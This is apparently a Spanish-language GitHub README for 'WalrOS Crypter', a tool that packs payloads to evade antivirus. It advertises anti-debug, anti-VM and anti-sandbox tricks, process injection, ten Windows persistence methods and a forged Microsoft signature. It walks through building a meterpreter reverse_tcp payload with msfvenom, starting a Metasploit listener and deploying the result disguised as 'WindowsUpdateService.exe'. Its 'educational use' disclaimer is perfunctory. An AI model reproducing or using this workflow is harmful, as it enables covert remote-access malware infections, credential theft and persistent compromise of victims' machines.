# 🦭 WalrOS Crypter v6.0 🔐

[![Version](https://img.shields.io/badge/version-6.0-red.svg)](https://github.com/m0rs1/WalrOS-Crypter)
[![Platform](https://img.shields.io/badge/platform-Kali%20Linux-blue.svg)]()
[![Python](https://img.shields.io/badge/python-3.11%2B-green.svg)]()
[![License](https://img.shields.io/badge/license-MIT-yellow.svg)]()
[![Status](https://img.shields.io/badge/status-stable-brightgreen.svg)]()

> **Crypter FUD avanzado con 10 métodos de persistencia + Firma digital falsa**

Un crypter diseñado para la investigación en seguridad ofensiva. Ofusca, encripta y protege cualquier payload con técnicas de evasión de antivirus. 

---

## ⚠️ Aviso legal (léelo)
Este software es SOLO para fines educativos y de investigación.
No garantizo que sea indetectable contra todos los antivirus.
Úsalo ÚNICAMENTE en sistemas que poseas o tengas permiso explícito.
El mal uso puede ser ilegal en tu jurisdicción.
El autor no se hace responsable del uso indebido ;)

---

## 🧠 Filosofía: FUD no es magia

Este crypter **no es jodidamente mágico**, es pura técnica:

- **Encripta** tu payload con AES-256-CBC
- **Ofusca** el stub para evitar detección estática
- **Inyecta** en procesos legítimos (explorer/svchost)
- **Persiste** en 10 ubicaciones diferentes
- **Suplanta** la firma digital de Microsoft

No es indetectable para siempre. Los antivirus mejoran cada día (o eso dicen). Esto es una **capa de protección**, no una solución mágica.

---

## 🏗️ Características

| Característica | Estado | Descripción |
|----------------|--------|-------------|
| AES-256-CBC | ✅ | Encriptación de nivel militar |
| Anti-Debug | ✅ | Detecta depuradores |
| Anti-VM | ✅ | Evade VirtualBox, VMWare, QEMU |
| Anti-Sandbox | ✅ | Ataques de temporización + usuarios sospechosos |
| 10 Persistencia | ✅ | Múltiples métodos (ver abajo) |
| Firma digital falsa | ✅ | Suplanta a Microsoft |
| Inyección de procesos | ✅ | explorer.exe, svchost.exe, winlogon.exe |
| Mutex | ✅ | Solo una instancia |
| Retraso aleatorio | ✅ | 3-15 segundos |
| Modo silencioso | ✅ | Sin ventanas de error |

---

## 📋 Métodos de Persistencia (10)

| # | Método | Ubicación | Dificultad de eliminación |
|---|--------|-----------|---------------------------|
| 1 | Claves de Registro Run | HKCU/HKLM Run | Media |
| 2 | Carpetas de Inicio | User/Common Startup | Fácil |
| 3 | Tareas Programadas | MicrosoftEdgeUpdateTask | Media |
| 4 | Servicios de Windows | sc.exe create | Alta |
| 5 | Suscripciones WMI | __EventFilter | Muy alta |
| 6 | Boot Execute | Session Manager | Extrema |
| 7 | IFEO Debugger | Image File Execution Options | Alta |
| 8 | AppInit_DLLs | Registro de Windows | Alta |
| 9 | Winlogon Notify | Winlogon\Notify | Muy alta |
| 10 | Userinit | Winlogon\Userinit | Alta |

---

## 🚀 Instalación

### Requisitos

- Kali Linux 2023+ (opcional y preferible)
- Python 3.11+
- Mono 6.8+
- OpenSSL

### Paso a paso

```bash
# 1. Clonar el repositorio
git clone https://github.com/m0rs1/WalrOS-Crypter.git
cd WalrOS-Crypter

# 2. Ejecutar script de instalación
chmod +x setup.sh
./setup.sh

# 3. Verificar instalación
mcs --version
python3 --version
⚙️ Configuración
Edita las variables en walros_crypter.py si quieres personalizar:

python
PAYLOAD_PATH = "payload.exe"      # Ruta de tu payload
OUTPUT_NAME = "WindowsUpdateService.exe"  # Nombre de salida
BUILD_DIR = "WalrOS_Builds"       # Carpeta de salida
▶️ Uso
Paso 1: Crear un payload (ejemplo con msfvenom)
bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=TU_IP LPORT=4444 -f exe -o payload.exe
Paso 2: Ejecutar el crypter
bash
python3 walros_crypter.py
Paso 3: Configurar el listener
bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST TU_IP
set LPORT 4444
set ExitOnSession false
exploit -j
Paso 4: Desplegar
El archivo protegido estará en:

text
WalrOS_Builds/WindowsUpdateService.exe
🛡️ Técnicas de evasión explicadas
Técnica	Cómo funciona
Anti-Debug	IsDebuggerPresent() + Debugger.IsAttached
Anti-VM	Detecta procesos (vmtoolsd, vboxservice) y nombres de máquina
Anti-Sandbox	Ataque de temporización + usuarios típicos de sandbox
Mutex	Evita múltiples instancias del mismo malware
Retraso aleatorio	Espera 3-15 segundos antes de ejecutar
Fallo silencioso	No muestra errores, muere en silencio
📁 Estructura del proyecto
text
WalrOS-Crypter/
├── docs/
│   ├── persistence.md          # Explicación de persistencia
│   └── usage.md                # Guía detallada
├── examples/
│   ├── listener_setup.md       # Configuración de listeners
│   └── payload_msfvenom.md     # Creación de payloads
├── .gitignore                  # Archivos ignorados
├── CHANGELOG.md                # Historial de versiones
├── LICENSE                     # Licencia MIT
├── README.md                   # Este archivo
├── requirements.txt            # Dependencias de Python
├── setup.sh                    # Instalador automático
└── walros_crypter.py           # Script principal
🔧 Solución de problemas
Mono no encontrado
bash
sudo apt install --reinstall mono-complete
Error de compilación
bash
mcs --version  # Debería mostrar 6.8 o superior
Error de Python
bash
pip3 install --upgrade cryptography pycryptodome
La firma digital falla
bash
sudo apt install osslsigncode
🧪 Pruebas
bash
# Verificar que Mono funciona
echo 'using System; class Test { static void Main() { Console.WriteLine("OK"); } }' > test.cs
mcs test.cs && mono test.exe

# Verificar imports de Python
python3 -c "import cryptography; import Crypto; print('OK')"
📊 Resultados esperados
Métrica	Valor
Tamaño de salida	~50-200 KB (depende del payload)
Tiempo de compilación	~5-10 segundos
Tasa FUD estimada	60-80% contra antivirus básicos
Persistencia	10 métodos activos

```

🤝 Contribuciones
Las pull requests son bienvenidas. Para cambios importantes, abre un issue primero perro.

📜 Licencia
Licencia MIT - Ver archivo LICENSE

👤 Autor
m0rs1 -- WalrOS

GitHub: @m0rs1

⭐ Apoya el proyecto
Si este proyecto te ha echado un cable, dale una estrella ⭐

Hecho solo para fines educativos 🦭

Ningún antivirus fue dañado permanentemente en la creación de este software xD